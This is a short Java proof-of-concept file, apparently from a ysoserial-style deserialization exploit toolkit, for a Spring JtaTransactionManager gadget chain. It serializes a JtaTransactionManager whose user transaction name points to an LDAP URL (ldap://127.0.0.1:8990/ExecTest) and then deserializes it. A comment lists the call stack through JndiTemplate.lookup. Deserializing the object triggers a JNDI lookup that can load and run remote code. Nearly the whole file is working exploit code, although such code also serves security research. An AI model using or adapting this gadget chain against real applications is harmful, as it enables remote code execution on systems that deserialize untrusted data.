package ysoserial.payloads.tabbyGadgetChains.Spring;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.Feature;
import org.springframework.transaction.jta.JtaTransactionManager;

import java.io.*;


/**
 * doInContext:154, JndiTemplate$1 (org.springframework.jndi)
 * execute:87, JndiTemplate (org.springframework.jndi)
 * lookup:152, JndiTemplate (org.springframework.jndi)
 * lookup:178, JndiTemplate (org.springframework.jndi)
 * lookupUserTransaction:546, JtaTransactionManager (org.springframework.transaction.jta)
 * initUserTransactionAndTransactionManager:426, JtaTransactionManager (org.springframework.transaction.jta)
 * readObject:1193, JtaTransactionManager (org.springframework.transaction.jta)
 */

public class Poc4 {
    public static void main(String[] args) throws Exception {
        JtaTransactionManager jtaTransactionManager = new JtaTransactionManager();
        jtaTransactionManager.setUserTransactionName("ldap://127.0.0.1:8990/ExecTest");

        //         serialize
        ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream("./ccv4"));
        outputStream.writeObject(jtaTransactionManager);
        outputStream.close();

        //         deserialize
        ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream("./ccv4"));
        inputStream.readObject();

    }
}
